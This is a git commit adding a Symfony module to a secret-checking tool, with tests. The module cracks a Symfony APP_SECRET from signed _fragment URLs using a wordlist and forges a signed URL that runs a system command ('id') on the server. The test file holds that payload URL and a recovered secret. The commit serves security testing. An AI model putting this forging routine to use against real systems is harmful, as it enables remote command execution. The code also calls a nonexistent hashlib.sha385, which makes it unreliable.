af1db6c85a824925b55856d242e473e9e9000147
liquidsec <paul.mueller08@gmail.com>
2023-02-11 22:45:43 -0500

    symfony module initial

---
+++ badsecrets/modules/symfony_signedurl.py
@@ -0,0 +1,50 @@
+import re
+import base64
+import hmac
+import hashlib
+
+from badsecrets.base import BadsecretsBase
+
+# Special thanks to Ambionics Security for their blog post: https://www.ambionics.io/blog/symfony-secret-fragment
+
+
+class Symfony_SignedURL(BadsecretsBase):
+    identify_regex = re.compile(r"http(?:s)?:\/\/[^\/]+\/_fragment[^\s]+_hash=[\/a-zA-z-0-9\+=%]{44,132}")
+    description = {"Product": "Symfony Signed URL", "Secret": "Symfony APP_SECRET"}
+
+    "https://localhost/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=Xnsvx/yLVQaimEd1CfepgH0rEXr422JnRSn/uaCE3gs="
+
+    def carve_regex(self):
+        return re.compile(r"(http(?:s)?:\/\/[^\/]+\/_fragment[^\s]+_hash=[\/a-zA-z-0-9\+=%]{44,132})")
+
+    def symfonyHMAC(self, url, secret, hash_algorithm):
+        return base64.b64encode(hmac.HMAC(secret.encode(), url.encode(), hash_algorithm).digest())
+
+    def symfonyPoC(self, secret, url, hash_algorithm):
+        host = url.split("_fragment")[0]
+        poc_string = "_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
+        full_url = f"{host}{poc_string}"
+        poc_hash = self.symfonyHMAC(full_url, secret, hash_algorithm)
+        poc_url = f"{full_url}&_hash={poc_hash.decode()}"
+        return poc_url
+
+    def symfonyVerify(self, value, secret):
+        url, url_hash = value.split("&_hash=")
+        for hash_algorithm in [hashlib.sha256, hashlib.sha1, hashlib.sha385, hashlib.sha512]:
+            generated_hash = self.symfonyHMAC(url, secret, hash_algorithm)
+            if generated_hash == url_hash.encode():
+                return {
+                    "hash algorithm": hash_algorithm.__name__.split("openssl_")[1],
+                    "PoC URL (executes 'id')": self.symfonyPoC(secret, url, hash_algorithm),
+                }
+        return False
+
+    def check_secret(self, signed_url):
+        if not self.identify(signed_url):
+            return None
+        for l in self.load_resource("symfony_appsecret.txt"):
+            password = l.rstrip()
+            r = self.symfonyVerify(value=signed_url, secret=password)
+            if r:
+                return {"secret": password, "details": r}
+        return None
---
+++ tests/symfony_signedurl_test.py
@@ -0,0 +1,20 @@
+import urllib.parse
+from badsecrets import modules_loaded
+
+Symfony_SignedURL = modules_loaded["symfony_signedurl"]
+
+
+# sha256
+def test_symfony_sha256():
+    s = "https://localhost/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=Xnsvx/yLVQaimEd1CfepgH0rEXr422JnRSn/uaCE3gs="
+    x = Symfony_SignedURL()
+    r = x.check_secret(s)
+    assert r
+    assert r["secret"] == "50c8215b436ebfcc1d568effb624a40e"
+
+
+def test_symfony_negative():
+    s = "https://localhost/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=Xnsvx/yLVQaimEd1CfepgH0rEXr422JnRSn/uaCE3gd="
+    x = Symfony_SignedURL()
+    r = x.check_secret(s)
+    assert not r
